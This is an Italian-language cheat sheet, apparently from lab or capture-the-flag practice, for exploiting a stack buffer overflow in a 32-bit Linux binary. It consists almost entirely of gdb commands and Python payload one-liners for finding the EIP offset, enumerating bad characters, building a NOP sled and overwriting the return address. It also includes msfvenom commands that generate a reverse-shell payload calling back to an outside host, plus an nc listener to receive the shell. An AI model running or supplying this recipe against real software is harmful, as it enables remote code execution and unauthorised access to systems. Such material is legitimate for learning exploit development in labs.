# shell
```shell
$ gdb -q eseguibile

(gdb) run $(python -c "print '\x55' * 1200") # 1200 valore a caso abbastanza grande, eventualmente modificare
(gdb) info registers # controllo che in  EPB e EIP ci sia 0x55555555

(gdb) run $(python -c "print 'PATTERN'") 
(gdb) info registers eip # prendere nota del valore ottenuto (nell'esempio 0x69423569)

(gdb) run $(python -c "print '\x55' * <exact_match> + '\x66' * 4")
(gdb) info registers eip # valore atteso 0x66666666



# In questo caso exact_match = 1036 
# quindi si parte da exact_match + 4 = 1036 + 4 = 1040
# Offset    "\x55" * (exact_match - Nobs - Shellcode - EIP) = "\x55" * (1040 - 100 - 150 - 4) 
# Nobs      "\x90" * 100
# Shellcode "\x44" * 150
# EIP       "\x66" * 4
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
(gdb) info registers eip # valore atteso 0x66666666 - a conferma che i conti sono giusti

(gdb) disas main
(gdb) break funzione_x # la funziona va trovata nel passaggio precendente individuando una "call"



# la variabile chars e' 256byte
(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "CHARS" + "\x66" * 4')
(gdb) x/2000xb $esp+5000 # verificare che dopo i \x55 ci sia la variabile CHARS - trovare eventuali caratteri mancanti alla serie attesa

# eliminare i caratteri mancanti dalla variabile, aggiornare le dimensioni e riprovare finche non c'e' tutta, senza saltare alcun carattere
(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "CHARS" + "\x66" * 4')
(gdb) x/2000xb $esp+5000 





# Usiamo la shellcode, attenzione ai conti 
# exactmathc + 4 - nops - shellcode - eip = 1036 + 4 - 124 - 95 - 4
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "SHELLCODE" + "\x66" * 4')
(gdb) x/2000xb $esp+550 # controlliamo che dopo i nops (\x90) ci siano i byte della shellcode



# individuiamo due punti:
# dove finiscono gli \x55 e iniziano gli \x90
# dove finiscono gli \x90 ed inizia lo shellcode
# scegliamo un indirizzo di memoria in questo intervallo 
# attenzione l'indirizzo di memoria scelto non deve contenere
# nessuno dei caratteri trovati durante la ricerca dei bad chars
(gdb) x/2000xb $esp+1400

# con indirizzo di memoria corretto - attenzione va scritto al contrario! - aggiornare anche i conti 
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "SHELLCODE" + "\x4c\xd6\xff\xff"')
```

# altra shell

```shell
# creazione del pattern - la dimensione e' quella trovata con run $(python -c "print '\x55' * 1200") - in questo caso 1200
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <DIM> > pattern.txt
# check esatta posizione pattern - indirizzo trovato ispezionando con info register eip
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <indirizzo> # e' il valore di cui abbiamo preso nota prima!, prendere nota del valore ottenuto, sara' la dimensione del payload per arrivare all'EIP
# generazione di una shell temporanea, giusto per capire le dimensioni
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c # con questi parametri e' 68bytes
# generazione di una shell vera e propria, possibile solo dopo aver ottenuto i bad chars
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.139 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode # prendere nota delle nuove dimensioni del payload - in questo esempio 95bytes
$ nc -nlvp 31337
```

# NOTE

```shell
# STRINGA di 256byte
$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
